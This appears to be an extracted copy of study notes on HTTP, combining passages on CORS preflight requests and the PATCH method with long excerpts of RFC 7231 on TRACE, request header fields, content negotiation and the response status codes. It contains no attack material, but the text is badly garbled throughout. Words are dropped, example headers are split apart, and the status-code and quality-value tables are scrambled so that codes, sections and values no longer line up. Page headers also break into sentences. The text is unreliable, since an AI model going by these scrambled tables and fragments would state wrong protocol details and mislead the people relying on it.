Allow: OPTIONS, GET, HEAD, POST
Cache-Control: max-age=604800
Date: Thu, 13 Oct 2016 11:45:00 GMT
Expires: Thu, 20 Oct 2016 11:45:00 GMT
Server: EOS (lax004/2813)
x-ec-custom-error: 1 Preflighted requests in CORS
 In CORS, a preflight request with the   method is sent, so that the server can respond whether it is acceptable to send the request with these parameters.
The Access-Control-Request-Method header notifies the server as part of a preflight request that when the actual request is sent, it will be sent with a request method.
The header notifies the server that when the actual request is sent, it will be sent with
a X-PINGOTHER and Content-Type custom headers. The server now has an opportunity to determine whether it wishes to accept a request under these circumstances.
 Access-Control-Request-Headers
OPTIONS
 POST
    OPTIONS /resources/post-here/ HTTP/1.1
Host: bar.other
Accept: text/html,application/
xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Origin: http://foo.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-PINGOTHER,
Content-Type
 The server responds with
Methods and says that   , GET, and   are viable methods to query the resource in question. This header is similar to the Allow response header, but used strictly within the context of CORS.
Access-Control-Allow-
POST
OPTIONS
  HTTP/1.1 204 No Content
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://foo.example ▪


##  Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER,
Content-Type
Access-Control-Max-Age: 86400
Vary: Accept-Encoding, Origin
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
4.3.8. TRACE
Syntax
- TRACE /index.html The TRACE method
requests a remote, application-level loop-back of the
request message. performs a message loop-back test along the path to the target resource, providing a useful debugging mechanism.
The final recipient of the request SHOULD reflect the
message received, excluding some fields described below, back to the client as the message body of a 200 (OK) response with a Content-Type of "message/http".
       ▪


##  The final recipient is either the origin server or the first server to receive a Max-Forwards value of zero (0) in the request.
TRACE request, A client MUST NOT generate header fields containing sensitive data that might be disclosed by the response.
For example, it would be foolish for a user agent to send stored user credentials or cookies in a TRACE request.
The final recipient of the request SHOULD exclude any
request header fields that are likely to contain sensitive data when that recipient generates the response body.
TRACE allows the client to see what is being received at the other end of the request chain and use that data for testing or diagnostic information.
The value of the Via header field is of particular interest, since it acts as a trace of the request chain.
Use of the Max-Forwards header field allows the client to
limit the length of the request chain, which is useful for testing a chain of proxies forwarding messages in an infinite loop.
A client MUST NOT send a message body in a TRACE request. Responses to the TRACE method are not cacheable.
         PATCH
The HTTP PATCH request method applies partial modifications to a resource.
PATCH is somewhat analogous to the "update" concept found
in CRUD (in general, HTTP is different than CRUD, and the two should not be confused).
A PATCH request is considered a set of instructions on how to modify a resource. Contrast this with PUT; which is a complete representation of a resource.
A PATCH is not necessarily idempotent, although it can be. Contrast this with PUT; which is always idempotent. For example if an auto-incrementing counter field is an integral part of the resource, then a PUT will naturally overwrite it (since it overwrites everything), but not necessarily so for PATCH.
PATCH (like PUT) may have side-effects on other resources.
To find out whether a server supports PATCH, a server can advertise its support by adding it to the list in
the Allow or Access-Control-Allow-Methods (for CORS) response headers.
Another (implicit) indication that PATCH is allowed, is the presence of the Accept-Patch header, which specifies the patch document formats accepted by the server.
                 Syntax
PATCH /file.txt HTTP/1.1
Example
 Request
  PATCH /file.txt HTTP/1.1
Host: www.example.com
Content-Type: application/example
If-Match: "e0023aa4e"
Content-Length: 100
[description of changes]
Response
 A successful response is indicated by any   .
a 204 response code is used, because the response does not carry a payload body.
A   could have contained a payload body.
2xx status code
 200 response
 HTTP/1.1 204 No Content
Content-Location: /file.txt
ETag: "e0023aa4f"
https://www.runoob.com/http/http-content-type.html
5. Request Header Fields
A client sends request header fields to provide more information about the request context, make the request conditional based on the target resource state, suggest preferred formats for the response, supply authentication credentials, or
   ▪


## modify the expected request processing.
These fields act as request modifiers, similar to the parameters on a programming language method invocation.
5.1. Controls
Controls are request header fields that direct specific
handling of the request.
   +-------------------
+--------------------------+
   | Header Field Name | Defined in...
|
   +-------------------
+--------------------------+
      | Cache-Control
[RFC7234] |
   | Expect
|
   | Host
[RFC7230] |
   | Max-Forwards
| Section 5.2 of
| Section 5.1.1
| Section 5.4 of
| Section 5.1.2
| Section 5.4 of
| Section 3.1 of
| Section 4.3 of
      |
   | Pragma
[RFC7234] |
   | Range
[RFC7233] |
   | TE
[RFC7230] |
         +-------------------
+--------------------------+
5.1.1. Expect
 ▪


## The Expect header field in a request indicates a certain set of behaviors (expectations) that need to be supported by the server in order to properly handle this request.
The only such expectation defined by this specification is 100-continue.
Expect = "100-continue"
The Expect field-value is case-insensitive.
A server that receives an field-value other than 100- continue MAY respond with a
status code to indicate that the unexpected expectation cannot be met.
A 100-continue expectation informs recipients that
the client is about to send a (presumably large) message
body in this request and wishes to receive a 100 (Continue) interim response if the request-line and header fields are not sufficient to cause an immediate success, redirect, or error response.
This allows the client to wait for an indication that it is
worthwhile to send the message body before actually doing
so,
which can improve efficiency when the message body is huge or
when the client anticipates that an error is likely (e.g., when sending a state-changing method, for the first time, without previously verified authentication credentials).
For example, a request that begins with
    Expect
 417 (Expectation Failed)
   ▪


##  PUT /somewhere/fun HTTP/1.1
Host: origin.example.com
Content-Type: video/h264
Content-Length: 1234567890987
Expect: 100-continue
allows the origin server to immediately respond with an error message, such as 401 (Unauthorized) or 405 (Method Not Allowed), before the client starts filling the pipes with an unnecessary data transfer.
Requirements for clients:
A client MUST NOT generate a 100-continue expectation in a request that does not include a message body.
A client that will wait for a 100 (Continue) response before
sending the request message body MUST send an Expect header field containing a 100-continue expectation.
A client that sends a 100-continue expectation is not
required to wait for any specific length of time; such a client MAY proceed to end the message body even if it has not yet received a response. Furthermore, since 100 (Continue) responses cannot be sent through an HTTP/1.0 intermediary, such a client SHOULD NOT wait for an indefinite period before sending the message body.
A client that receives a 417 (Expectation Failed) status code
in response to a request containing a 100-continue expectation SHOULD repeat that request without a 100- continue expectation, since the 417 response merely indicates that the response chain does not support expectations (e.g., it passes through an HTTP/1.0 server).
Requirements for servers:
     ▪


##  A server that receives a 100-continue expectation in an HTTP/1.0 request MUST ignore that expectation.
A server MAY omit sending a 100 (Continue) response if it
has already received some or all of the message body for the corresponding request, or if the framing indicates that there is no message body.
A server that sends a 100 (Continue) response MUST
ultimately send a final status code, once the message body is received and processed, unless the connection is closed prematurely.
A server that responds with a final status code before
reading the entire message body SHOULD indicate in that response whether it intends to close the connection or continue reading and discarding the request message (see Section 6.6 of [RFC7230]).
An origin server MUST, upon receiving an HTTP/1.1 (or later) request-line and a complete header section that contains a 100- continue expectation and indicates a request message body will follow,
either send an immediate response with a final status code, if that status can be determined by examining just the
request-line and header fields,
or send an immediate 100 (Continue) response to encourage the client to send the request's message body.
The origin server MUST NOT wait for the message body before sending the 100 (Continue) response.
A proxy MUST, upon receiving an HTTP/1.1 (or later) request-line and a complete header section that contains a 100-continue
       ▪


## expectation and indicates a request message body will follow,
either send an immediate response with a final status code, if that status can be determined by examining just the
request-line and header fields,
or begin forwarding the request toward the origin server by sending a corresponding request-line and header section to
the next inbound server.
If the proxy believes (from configuration or past interaction)
that the next inbound server only supports HTTP/1.0, the proxy MAY generate an immediate 100 (Continue) response to encourage the client to begin sending the message body.
Note: The Expect header field was added after the original publication of HTTP/1.1 [RFC2068] as both the means to request an interim 100 (Continue) response and the general mechanism for indicating must-understand extensions. However, the extension mechanism has not been used by clients and the must-understand requirements have not been implemented by many servers, rendering the extension mechanism useless. This specification has removed the extension mechanism in order to simplify the definition and processing of 100-continue.
5.1.2. Max-Forwards
The   header field provides a mechanism with the and   request methods to limit the number of
times that the request is forwarded by proxies.
This can be useful when the client is attempting to trace a
request that appears to be failing or looping mid-chain.
    Max-Forwards
 TRACE
OPTIONS
 ▪


## Max-Forwards = 1*DIGIT
The Max-Forwards value is a decimal integer indicating the remaining number of times this request message can be forwarded.
Each intermediary that receives a TRACE or OPTIONS request containing a Max-Forwards header field MUST check and update its value prior to forwarding the request.
If the received Max-Forwards value = 0, the intermediary MUST NOT forward the request; instead, the intermediary
MUST respond as the final recipient.
If the received value > 0, the intermediary
MUST generate an updated field in the forwarded message with a field-value that is the lesser of
  - a) the received value decremented by one (1)
  - b) the recipient's maximum supported value for Max-
Forwards.
A recipient MAY ignore a Max-Forwards header field received
with any other request methods.
5.2. Conditionals
The HTTP conditional request header fields allow a client to
place a precondition on the state of the target resource,
the action corresponding to the method semantics will not
be applied if the precondition evaluates to false.
Each precondition defined by this specification consists of a
comparison between a set of validators obtained from prior 1,476
        Max-Forwards
 Max-Forwards

▪
representations of the target resource to the current state of validators for the selected representation.
these preconditions evaluate whether the state of the target resource has changed since a given state known by the
client.
The effect of such an evaluation depends on the
methodsemantics and choice of conditional, as defined in Section 5 of [RFC7232].
+---------------------+--------------------------+
| Header Field Name   | Defined in...            |
+---------------------+--------------------------+
  | If-Match
| Section 3.1 of [RFC7232] |
| Section 3.2 of [RFC7232] |
| Section 3.3 of [RFC7232] |
  | If-None-Match
| If-Modified-Since
| If-Unmodified-Since | Section 3.4 of [RFC7232] |
| If-Range            | Section 3.2 of [RFC7233] |
+---------------------+--------------------------+
        5.3. Content Negotiation
 The following request header fields are sent by a user agent to engage in proactive negotiation of the response content.
The preferences sent in these fields apply to any content in the response, including representations of the target resource, representations of error or processing status, and potentially even the miscellaneous text strings that might appear within the protocol.
   +-------------------+---------------+
   | Header Field Name | Defined in... |
   +-------------------+---------------+ | Accept
                       | Section 5.3.2 |
                       | Section 5.3.3 |
                       | Section 5.3.4 |
                       | Section 5.3.5 |
Many of the request header fields for proactive negotiation use a common parameter, named "q" (case-insensitive), to assign a relative "weight" to the preference for that associated kind of content.
This weight is referred to as a "quality value" (or "qvalue") because the same parameter name is often used within server configurations to assign a weight to the relative quality of the various representations that can be selected for a resource. The weight is normalized to a real number in the range 0 through 1, where 0.001 is the least preferred and 1 is the most preferred; a value of 0 means "not acceptable". If no "q" parameter is present, the default weight is 1.
weight = OWS ";" OWS "q=" qvalue qvalue = ( "0" [ "." 0*3DIGIT ] )
/ ( "1" [ "." 0*3("0") ] )
A sender of qvalue MUST NOT generate more than three digits after the decimal point.
User configuration of these values ought to be limited in the same fashion.
5.3.2. Accept
The "Accept" header field can be used by user agents to
 | Accept-Charset
| Accept-Encoding
| Accept-Language
+-------------------+---------------+
   5.3.1. Quality Values
 specify
response media types that are acceptable. Accept header
fields can
be used to indicate that the request is specifically limited to a small set of desired types, as in the case of a request for an in-line image.
Accept = #( media-range [ accept-params ] )
media-range = ( "*/*"
/ ( type "/" "*" )
/ ( type "/" subtype )
) *( OWS ";" OWS parameter ) accept-params = weight *( accept-ext )
accept-ext = OWS ";" OWS token [ "=" ( token / quoted- string ) ]
The asterisk "*" character is used to group media types into ranges,
with "*/*" indicating all media types and "type/*" indicating all
subtypes of that type. The media-range can include media type
parameters that are applicable to that range.
Each media-range might be followed by zero or more applicable media
type parameters (e.g., charset), an optional "q" parameter for
indicating a relative weight (Section 5.3.1), and then zero or more
extension parameters. The "q" parameter is necessary if any extensions (accept-ext) are present, since it acts as a separator between the two parameter sets.
 Note: Use of the "q" parameter name to separate media type
parameters from Accept extension parameters is due to historical
practice. Although this prevents any media type parameter named
"q" from being used with a media range, such an event is believed
to be unlikely given the lack of any "q" parameters in the IANA
media type registry and the rare usage of any media type
parameters in Accept. Future media types are discouraged from
registering any parameter named "q". The example
Accept: audio/*; q=0.2, audio/basic
is interpreted as "I prefer audio/basic, but send me any audio type
if it is the best available after an 80% markdown in quality".
A request without any Accept header field implies that the user agent
will accept any media type in response. If the header field is
present in a request and none of the available representations for
the response have a media type that is listed as acceptable, the
origin server can either honor the header field by sending a 406 (Not
Acceptable) response or disregard the header field by treating the
response as if it is not subject to content negotiation.
A more elaborate example is
Accept: text/plain; q=0.5, text/html, text/x-dvi; q=0.8, text/x-c
Verbally, this would be interpreted as "text/html and text/x-c are
the equally preferred media types, but if they do not exist, then
send the text/x-dvi representation, and if that does not exist, send
the text/plain representation".
Media ranges can be overridden by more specific media ranges or
specific media types. If more than one media range applies to a
given type, the most specific reference has precedence. For example,
Accept: text/*, text/plain, text/plain;format=flowed, */* have the following precedence:
1. text/plain;format=flowed
2. text/plain
3. text/* 4. */* The media type quality factor associated with a given type is
determined by finding the media range with the highest precedence
that matches the type. For example,
Accept: text/*;q=0.3, text/html;q=0.7, text/html;level=1, text/html;level=2;q=0.4, */*;q=0.5
would cause the following values to be associated:
+-------------------+---------------+ | Media Type | Quality Value | +-------------------+---------------+
| 0.7 | 0.3
|
|
| 0.5
| |
| |
| text/html;level=1 | 1
| text/html
| text/plain
| image/jpeg
| text/html;level=2 | 0.4
| text/html;level=3 | 0.7 +-------------------+---------------+
Note: A user agent might be provided with a default set of quality
values for certain media ranges. However, unless the user agent is a
closed system that cannot interact with other rendering agents, this
default set ought to be configurable by the user.
5.3.3. Accept-Charset
The "Accept-Charset" header field can be sent by a user agent
 to
indicate what charsets are acceptable in textual response
content.
This field allows user agents capable of understanding more comprehensive or special-purpose charsets to signal that
capability
to an origin server that is capable of representing information in those charsets.
Accept-Charset = 1#( ( charset / "*" ) [ weight ] )
Charset names are defined in Section 3.1.1.2. A user agent MAY
associate a quality value with each charset to indicate the user's
relative preference for that charset, as defined in Section 5.3.1. An example is
Accept-Charset: iso-8859-5, unicode-1-1;q=0.8
The special value "*", if present in the Accept-Charset field, matches every charset that is not mentioned elsewhere in the Accept-Charset field. If no "*" is present in an Accept-Charset field, then any charsets not explicitly mentioned in the field are considered "not acceptable" to the client.
A request without any Accept-Charset header field implies that the
user agent will accept any charset in response. Most general- purpose
user agents do not send Accept-Charset, unless specifically
 Fielding & Reschke Standards Track [Page 40]
RFC 7231 HTTP/1.1 Semantics and Content 2014
configured to do so, because a detailed list of supported charsets
June
 makes it easier for a server to identify an individual by virtue of the user agent's request characteristics (Section 9.7).
If an Accept-Charset header field is present in a request and none of
the available representations for the response has a charset that is
listed as acceptable, the origin server can either honor the header
field, by sending a 406 (Not Acceptable) response, or disregard the
header field by treating the resource as if it is not subject to content negotiation.
5.3.4. Accept-Encoding
The "Accept-Encoding" header field can be used by user agents to
indicate what response content-codings (Section 3.1.2.1) are
acceptable in the response. An "identity" token is used as a synonym
for "no encoding" in order to communicate when no encoding is
   preferred.
Accept-Encoding = #( codings [ weight ] ) codings = content-coding / "identity" / "*"
Each codings value MAY be given an associated quality value representing the preference for that encoding, as defined in Section 5.3.1. The asterisk "*" symbol in an Accept-Encoding
field
matches any available content-coding not explicitly listed in the header field.
For example,
Accept-Encoding: compress, gzip Accept-Encoding:
Accept-Encoding: *
Accept-Encoding: compress;q=0.5, gzip;q=1.0 Accept-Encoding: gzip;q=1.0, identity; q=0.5, *;q=0
A request without an Accept-Encoding header field implies that the
user agent has no preferences regarding content-codings. Although
this allows the server to use any content-coding in a response, it
does not imply that the user agent will be able to correctly process
all encodings.
A server tests whether a content-coding for a given representation is
acceptable using these rules:
 1. If no Accept-Encoding field is in the request, any content- coding
is considered acceptable by the user agent.
2. If the representation has no content-coding, then it is acceptable by default unless specifically excluded by the Accept-Encoding field stating either "identity;q=0" or "*;q=0" without a more specific entry for "identity".
3. If the representation's content-coding is one of the content-codings listed in the Accept-Encoding field, then it is acceptable unless it is accompanied by a qvalue of 0. (As defined in Section 5.3.1, a qvalue of 0 means "not
acceptable".)
4. If multiple content-codings are acceptable, then the acceptable
content-coding with the highest non-zero qvalue is preferred.
An Accept-Encoding header field with a combined field-value that is
empty implies that the user agent does not want any content- coding in
response. If an Accept-Encoding header field is present in a request
and none of the available representations for the response have a
content-coding that is listed as acceptable, the origin server SHOULD
send a response without any content-coding.
 Note: Most HTTP/1.0 applications do not recognize or obey qvalues
associated with content-codings. This means that qvalues might
not work and are not permitted with x-gzip or x-compress.
5.3.5. Accept-Language
The "Accept-Language" header field can be used by user agents to
indicate the set of natural languages that are preferred in the response. Language tags are defined in Section 3.1.3.1.
Accept-Language = 1#( language-range [ weight ] ) language-range =
<language-range, see [RFC4647], Section 2.1>
Each language-range can be given an associated quality value
representing an estimate of the user's preference for the languages
specified by that range, as defined in Section 5.3.1. For example,
Accept-Language: da, en-gb;q=0.8, en;q=0.7
would mean: "I prefer Danish, but will accept British English and
other types of English".
A request without any Accept-Language header field implies that the
user agent will accept any language in response. If the header field
     is present in a request and none of the available representations for
the response have a matching language tag, the origin server can
either disregard the header field by treating the response as if it
Fielding & Reschke Standards Track [Page 42]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
is not subject to content negotiation or honor the header field by
sending a 406 (Not Acceptable) response. However, the latter is not
encouraged, as doing so can prevent users from accessing content that
they might be able to use (with translation software, for example).
Note that some recipients treat the order in which language tags are
listed as an indication of descending priority, particularly for tags
that are assigned equal quality values (no value is the same as q=1).
However, this behavior cannot be relied upon. For consistency and to
maximize interoperability, many user agents assign each
 language tag
a unique quality value while also listing them in order of
decreasing
quality. Additional discussion of language priority lists can be found in Section 2.3 of [RFC4647].
For matching, Section 3 of [RFC4647] defines several matching
schemes. Implementations can offer the most appropriate matching
scheme for their requirements. The "Basic Filtering" scheme
([RFC4647], Section 3.3.1) is identical to the matching scheme that
was previously defined for HTTP in Section 14.4 of [RFC2616].
It might be contrary to the privacy expectations of the user to send
an Accept-Language header field with the complete linguistic preferences of the user in every request (Section 9.7).
Since intelligibility is highly dependent on the individual user,
user agents need to allow user control over the linguistic preference
(either through configuration of the user agent itself or by
defaulting to a user controllable system setting). A user agent that
does not provide such control to the user MUST NOT send an Accept-Language header field.
Note: User agents ought to provide guidance to users when setting
a preference, since users are rarely familiar with the details of
language matching as described above. For example, users might
         assume that on selecting "en-gb", they will be served any kind of
English document if British English is not available. A user
agent might suggest, in such a case, to add "en" to the list for
better matching behavior.
5.4. Authentication Credentials
Two header fields are used for carrying authentication credentials,
as defined in [RFC7235]. Note that various custom mechanisms for
user authentication use the Cookie header field for this purpose, as
defined in [RFC6265].
+---------------------+--------------------------+
| Header Field Name | Defined in... | +---------------------+--------------------------+
| Authorization | Section 4.2 of [RFC7235] |
| Proxy-Authorization | Section 4.4 of [RFC7235] | +---------------------+--------------------------+
5.5. Request Context
The following request header fields provide additional information
about the request context, including information about the user, user
agent, and resource behind the request.
       +-------------------+---------------+
| Header Field Name | Defined in... | +-------------------+---------------+
| From
5.5.1. From
The "From" header field contains an Internet email address for
a
human user who controls the requesting user agent. The
address ought
to be machine-usable, as defined by "mailbox" in Section 3.4
of [RFC5322]:
From = mailbox
mailbox = <mailbox, see [RFC5322], Section 3.4> An example is:
From: webmaster@example.org
The From header field is rarely sent by non-robotic user agents. A
user agent SHOULD NOT send a From header field without explicit
configuration by the user, since that might conflict with the user's
privacy interests or their site's security policy.
| Section 5.5.1 | | Section 5.5.2 |
 | Referer
| User-Agent +-------------------+---------------+
 | Section 5.5.3 |
     Fielding & Reschke Standards Track [Page 44]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
A robotic user agent SHOULD send a valid From header field so that
the person responsible for running the robot can be contacted if
problems occur on servers, such as if the robot is sending excessive,
unwanted, or invalid requests.
A server SHOULD NOT use the From header field for access control or
authentication, since most recipients will assume that the field value is public information.
5.5.2. Referer
The "Referer" [sic] header field allows the user agent to specify
a
URI reference for the resource from which the target URI was
obtained
(i.e., the "referrer", though the field name is misspelled). A user agent MUST NOT include the fragment and userinfo
components of the
 URI reference [RFC3986], if any, when generating the Referer field
value.
Referer = absolute-URI / partial-URI
The Referer header field allows servers to generate back-links to
other resources for simple analytics, logging, optimized caching,
etc. It also allows obsolete or mistyped links to be found for
maintenance. Some servers use the Referer header field as a means of
denying links from other sites (so-called "deep linking") or
restricting cross-site request forgery (CSRF), but not all requests
contain it. Example:
Referer: http://www.example.org/hypertext/Overview.html
If the target URI was obtained from a source that does not have its
own URI (e.g., input from the user keyboard, or an entry within the
user's bookmarks/favorites), the user agent MUST either exclude the
Referer field or send it with a value of "about:blank".
The Referer field has the potential to reveal information about the
request context or browsing history of the user, which is a
 privacy
concern if the referring resource's identifier reveals personal information (such as an account name) or a resource that is
supposed
to be confidential (such as behind a firewall or internal to a secured service). Most general-purpose user agents do not
send the
Referer header field when the referring resource is a local "file"
or
"data" URI. A user agent MUST NOT send a Referer header
field in an
unsecured HTTP request if the referring page was received
with a
secure protocol. See Section 9.4 for additional security considerations.
Fielding & Reschke Standards Track [Page 45]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
Some intermediaries have been known to indiscriminately remove
Referer header fields from outgoing requests. This has the
unfortunate side effect of interfering with protection against CSRF
attacks, which can be far more harmful to their users. Intermediaries and user agent extensions that wish to limit information disclosure in Referer ought to restrict their changes
 to
specific edits, such as replacing internal domain names with pseudonyms or truncating the query and/or path components.
An
intermediary SHOULD NOT modify or delete the Referer header
field
when the field value shares the same scheme and host as the
request target.
5.5.3. User-Agent
The "User-Agent" header field contains information about the user
agent originating the request, which is often used by servers to help
identify the scope of reported interoperability problems, to work
around or tailor responses to avoid particular user agent
limitations, and for analytics regarding browser or operating system
use. A user agent SHOULD send a User-Agent field in each request
unless specifically configured not to do so. User-Agent = product *( RWS ( product / comment ) )
The User-Agent field-value consists of one or more product
identifiers, each followed by zero or more comments (Section 3.2 of
[RFC7230]), which together identify the user agent software and its
significant subproducts. By convention, the product identifiers
   are
listed in decreasing order of their significance for identifying the user agent software. Each product identifier consists of a
name and optional version.
product = token ["/" product-version] product-version = token
A sender SHOULD limit generated product identifiers to what is
necessary to identify the product; a sender MUST NOT generate
advertising or other nonessential information within the product identifier. A sender SHOULD NOT generate information in product-version that is not a version identifier (i.e., successive versions of the same product name ought to differ only in the product-version portion of the product identifier).
Example:
User-Agent: CERN-LineMode/2.15 libwww/2.17b3
A user agent SHOULD NOT generate a User-Agent field containing
needlessly fine-grained detail and SHOULD limit the addition of
subproducts by third parties. Overly long and detailed User- Agent
field values increase request latency and the risk of a user being
identified against their wishes ("fingerprinting").
Likewise, implementations are encouraged not to use the product
tokens of other implementations in order to declare
compatibility
with them, as this circumvents the purpose of the field. If a
user
agent masquerades as a different user agent, recipients can
assume
that the user intentionally desires to see responses tailored for that identified user agent, even if they might not work as well
for
the actual user agent being used.
6. Response Status Codes
 The status-code element is a three-digit integer code giving the result of the attempt to understand and satisfy the request.
HTTP status codes are extensible. HTTP clients are not required to understand the meaning of all registered status codes, though such understanding is obviously desirable. However, a client MUST understand the class of any status code, as indicated by the first digit, and treat an unrecognized status code as being equivalent to
the x00 status code of that class, with the exception that a
recipient MUST NOT cache a response with an unrecognized status code.
For example, if an unrecognized status code of 471 is received by a client, the client can assume that there was something wrong with its request and treat the response as if it had received a 400 (Bad Request) status code. The response message will usually contain a representation that explains the status.
The first digit of the status-code defines the class of response. The last two digits do not have any categorization role. There are five values for the first digit:
o 1xx (Informational): The request was received, continuing process
o 2xx (Successful): The request was successfully received, understood, and accepted
o 3xx (Redirection): Further action needs to be taken in order to complete the request
o 4xx (Client Error): The request contains bad syntax or cannot be fulfilled
Fielding & Reschke Standards Track [Page 47]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
o 5xx (Server Error): The server failed to fulfill an apparently
 valid request
6.1. Overview of Status Codes
The status codes listed below are defined in this specification,
Section 4 of [RFC7232], Section 4 of [RFC7233], and Section 3 of [RFC7235]. The reason phrases listed here are only recommendations -- they can be replaced by local equivalents without affecting the protocol.
Responses with status codes that are defined as cacheable by default (e.g., 200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501 in
this specification) can be reused by a cache with heuristic
expiration unless otherwise indicated by the method definition or explicit cache controls [RFC7234]; all other status codes are not cacheable by default.
       Fielding & Reschke Standards Track [Page 48]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
+------+-------------------------------+--------------------------+ | Code | Reason-Phrase | Defined in... | +------+-------------------------------+--------------------------+
 | 100 | Continue
| 101 | Switching Protocols | 200 | OK
| 201 | Created
| 202 | Accepted
| Section 6.2.1
| Section 6.2.2
| Section 6.3.1
| Section 6.3.2
|
|
|
|
    | Section 6.3.3
| 203 | Non-Authoritative Information | Section 6.3.4
|
  | 204 | No Content
| 205 | Reset Content
| 206 | Partial Content
| 300 | Multiple Choices
| 301 | Moved Permanently
| Section 6.3.5 | Section 6.3.6
| |
 |
| Section 4.1 of [RFC7233] |
   | Section 6.4.1 | | Section 6.4.2
|
 | 302 | Found
| Section 6.4.3 | | Section 6.4.4
 | 303 | See Other
| 304 | Not Modified
| 305 | Use Proxy
| 307 | Temporary Redirect
| 400 | Bad Request
| 401 | Unauthorized
| 402 | Payment Required
| 403 | Forbidden
| 404 | Not Found
| 405 | Method Not Allowed
| 406 | Not Acceptable
| 407 | Proxy Authentication Required | Section 3.2 of [RFC7235] |
|
| Section 4.1 of [RFC7232] |
   | Section 6.4.5
| Section 6.4.7
|
|
| |
|
|
|
| |
| |
  | Section 6.5.1
| Section 3.1 of [RFC7235] |
|
   | Section 6.5.2 | Section 6.5.3
  | Section 6.5.4
| Section 6.5.5
     | 408 | Request Timeout
| 409 | Conflict
| 410 | Gone
| 411 | Length Required
| 412 | Precondition Failed | 413 | Payload Too Large | 414 | URI Too Long
| Section 6.5.6 | Section 6.5.7
 | Section 6.5.8 | Section 6.5.9
| Section 6.5.10
| Section 4.2 of [RFC7232] |
 |
|
    | Section 6.5.11 | Section 6.5.12
  | 415 | Unsupported Media Type | 416 | Range Not Satisfiable
| 417 | Expectation Failed
| 426 | Upgrade Required
| Section 6.5.13
| Section 4.4 of [RFC7233] |
|
     | 500 | Internal Server Error | 501 | Not Implemented
| 502 | Bad Gateway
| 503 | Service Unavailable | 504 | Gateway Timeout
| Section 6.5.14
| Section 6.5.15
| Section 6.6.1 | Section 6.6.2
| Section 6.6.3
| Section 6.6.4
|
|
| |
|
|
    |
|
+------+-------------------------------+--------------------------+
| Section 6.6.5
| 505 | HTTP Version Not Supported | Section 6.6.6
 Fielding & Reschke Standards Track [Page 49]
RFC 7231 HTTP/1.1 Semantics and Content
June 2014
 Note that this list is not exhaustive -- it does not include
extension status codes defined in other specifications. The complete list of status codes is maintained by IANA. See Section 8.2 for details.
6.2. Informational 1xx
The 1xx (Informational) class of status code indicates an interim response for communicating connection status or request progress prior to completing the requested action and sending a final response. 1xx responses are terminated by the first empty line after the status-line (the empty line signaling the end of the header section). Since HTTP/1.0 did not define any 1xx status codes, a server MUST NOT send a 1xx response to an HTTP/1.0 client.
A client MUST be able to parse one or more 1xx responses received prior to a final response, even if the client does not expect one. A user agent MAY ignore unexpected 1xx responses.
A proxy MUST forward 1xx responses unless the proxy itself requested the generation of the 1xx response. For example, if a proxy adds an "Expect: 100-continue" field when it forwards a request, then it need not forward the corresponding 100 (Continue) response(s).
6.2.1. 100 Continue
The 100 (Continue) status code indicates that the initial part of a
 request has been received and has not yet been rejected by the server. The server intends to send a final response after the request has been fully received and acted upon.
When the request contains an Expect header field that includes a 100-continue expectation, the 100 response indicates that the server wishes to receive the request payload body, as described in
Section 5.1.1. The client ought to continue sending the request and discard the 100 response.
If the request did not contain an Expect header field containing the 100-continue expectation, the client can simply discard this interim response.
6.2.2. 101 Switching Protocols
The 101 (Switching Protocols) status code indicates that the server understands and is willing to comply with the client's request, via the Upgrade header field (Section 6.7 of [RFC7230]), for a change in the application protocol being used on this connection. The server
Fielding & Reschke Standards Track [Page 50]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
MUST generate an Upgrade header field in the response that indicates which protocol(s) will be switched to immediately after the empty
line that terminates the 101 response.
It is assumed that the server will only agree to switch protocols
     when it is advantageous to do so. For example, switching to a newer version of HTTP might be advantageous over older versions, and switching to a real-time, synchronous protocol might be advantageous when delivering resources that use such features.
6.3. Successful 2xx
The 2xx (Successful) class of status code indicates that the client's
request was successfully received, understood, and accepted.
6.3.1. 200 OK
The 200 (OK) status code indicates that the request has succeeded. The payload sent in a 200 response depends on the request method. For the methods defined by this specification, the intended meaning of the payload can be summarized as:
GET a representation of the target resource;
HEAD the same representation as GET, but without the representation data;
POST a representation of the status of, or results obtained from, the action;
PUT, DELETE a representation of the status of the action;
OPTIONS a representation of the communications options;
TRACE a representation of the request message as received by the end server.
Aside from responses to CONNECT, a 200 response always has a payload, though an origin server MAY generate a payload body of zero length.
If no payload is desired, an origin server ought to send 204 (No
 Content) instead. For CONNECT, no payload is allowed because the successful result is a tunnel, which begins immediately after the 200 response header section.
A 200 response is cacheable by default; i.e., unless otherwise indicated by the method definition or explicit cache controls (see Section 4.2.2 of [RFC7234]).
Fielding & Reschke Standards Track [Page 51]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 6.3.2. 201 Created
The 201 (Created) status code indicates that the request has been fulfilled and has resulted in one or more new resources being created. The primary resource created by the request is identified by either a Location header field in the response or, if no Location field is received, by the effective request URI.
The 201 response payload typically describes and links to the resource(s) created. See Section 7.2 for a discussion of the meaning and purpose of validator header fields, such as ETag and Last-Modified, in a 201 response.
6.3.3. 202 Accepted
The 202 (Accepted) status code indicates that the request has been accepted for processing, but the processing has not been completed. The request might or might not eventually be acted upon, as it might
     be disallowed when processing actually takes place. There is no facility in HTTP for re-sending a status code from an asynchronous operation.
The 202 response is intentionally noncommittal. Its purpose is to allow a server to accept a request for some other process (perhaps a batch-oriented process that is only run once per day) without requiring that the user agent's connection to the server persist
until the process is completed. The representation sent with this response ought to describe the request's current status and point to (or embed) a status monitor that can provide the user with an estimate of when the request will be fulfilled.
6.3.4. 203 Non-Authoritative Information
The 203 (Non-Authoritative Information) status code indicates that
the request was successful but the enclosed payload has been modified from that of the origin server's 200 (OK) response by a transforming proxy (Section 5.7.2 of [RFC7230]). This status code allows the
proxy to notify recipients when a transformation has been applied,
since that knowledge might impact later decisions regarding the content. For example, future cache validation requests for the
